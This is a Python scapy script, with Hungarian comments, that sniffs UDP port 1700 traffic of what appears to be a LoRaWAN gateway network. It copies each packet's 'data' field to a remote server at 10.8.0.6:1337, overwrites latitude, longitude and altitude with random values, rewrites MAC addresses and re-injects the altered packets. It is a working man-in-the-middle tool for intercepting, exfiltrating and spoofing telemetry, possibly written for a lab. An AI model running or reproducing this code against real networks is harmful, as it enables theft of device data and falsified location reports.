from scapy.all import *
from datetime import datetime
import random
import time
import client
import threading
import queue

msg_queue = queue.Queue()
payloads = []
last_check = time.time()
    
lati = f'"lati":{round(random.randint(1000,90000) * 0.001, 4)}'.encode()
long = f'"long":{round(random.randint(1000,180000) * 0.001, 4)}'.encode()
alti = f'"alti":{round(random.randint(0,10000))}'.encode()

ip_to_mac = {
    "10.1.1.4" : "08:00:27:ab:4e:38",
    "10.1.1.8" : "08:00:27:70:95:59",
    "192.168.0.81" : "b8:27:eb:c8:24:ff",
    "192.168.0.244" : "dc:a6:32:80:0d:ff"
}


def main():
    print("[*] Start")
    print(f"Last check: {last_check}")
    sniffing = threading.Thread(target=sniff_thread)
    chat = threading.Thread(target=chat_thread)

    sniffing.start()
    chat.start()

    sniffing.join()
    chat.join()

def sniff_thread():
    sniff(filter="udp port 1700", prn=packet_callback)

def chat_thread():
    client_socket = client.connection("10.8.0.6", 1337)
    msg = client_socket.recv(2048)
    print(msg.decode())
    while True:
        try:
            # Megnézzük, van-e üzenet a queue-ban
            packet = msg_queue.get_nowait()
            print(f"[+] Küldöm a szervernek: {packet}")
            client_socket.send(packet)
            msg = client_socket.recv(2048).decode()

        except queue.Empty:
            # Nincs semmi új a queue-ban
            pass

        except Exception as e:
            print(f"Error: {e}")


def save_packets(packet: bytes, file: str):
    with open(file, 'ab') as w:
        w.write(packet)

def packet_callback(packet):
    if packet.haslayer(UDP):    
        mypayload = bytes(packet[UDP].payload)
        if mypayload not in payloads:
            payloads.append(mypayload)
        else:
            return


        try:
            mydata = get_changeable_bytes(mypayload, b'"data"', b'}')
            if len(mydata) > 0:
                print("Mypayload", mypayload)
                print("Mydata", mydata)
                msg_queue.put(mydata)
        except Exception as e:
            print(f"Error: {e}")       
        
        if b'"lati"' in mypayload:
            new_payload = change_coordinates(mypayload)
        else:
            new_payload = mypayload
        
        modify_and_forward(packet, new_payload)

def change_coordinates(payload: bytes):
    global lati
    global long
    global alti
    
    latitude = get_changeable_bytes(payload, b'"lati"', b',')
    longitude = get_changeable_bytes(payload, b'"long"', b',')
    altitude = get_changeable_bytes(payload, b'"alti"', b',')
    
    new_payload = payload.replace(latitude, lati)
    new_payload = new_payload.replace(longitude, long)
    new_payload = new_payload.replace(altitude, alti)
    today = datetime.today().strftime("%Y%m%d")
    save_packets(new_payload,f'new_payloads_{today}.txt')
    return new_payload

def get_changeable_bytes(payload: bytes, start_byte: bytes, end_byte: bytes):
    start_index = payload.find(start_byte)
    stop_index = payload[start_index:].find(end_byte) + start_index
    result = payload[start_index:stop_index]
    return result

def check_time():
    global last_check
    if time.time() - last_check >= 6000:
        print(f'[*] Bye.')
        exit(0)


def modify_and_forward(packet, payload: bytes):
    
    packet = rewrite_dst_mac(packet)

    # Csomag tartalmának módosítása
    packet[Raw].load = payload

    # checksumok újraszámolása
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum

    try:
        sendp(packet, verbose=False)
    except:
        pass
    check_time()

def rewrite_dst_mac(packet):
    if not (packet.haslayer(Ether) and packet.haslayer(IP)):
        return packet  # Ha nincs IP vagy Ethernet réteg, ne nyúlj hozzá

    # wlan0 interface MAC címét kiszedjük
    src_mac = get_if_hwaddr("wlan0")
    
    # cél IP a csomagból
    dst_ip = packet[IP].dst

    # Nézzük meg, hogy a cél IP-hez ismerünk-e MAC-et
    dst_mac = ip_to_mac[dst_ip]
    if dst_mac is None:
        print(f"[!] Nem ismert MAC a cél IP-hez: {dst_ip}")
        return packet  # Nem tudjuk hova küldeni, maradjon a régi MAC

    # Forrás MAC a mi saját MAC-ünk, cél MAC az eredeti IP-hez tartozó MAC
    packet[Ether].dst = dst_mac
    packet[Ether].src = src_mac

    return packet

if __name__ == "__main__":
    main()
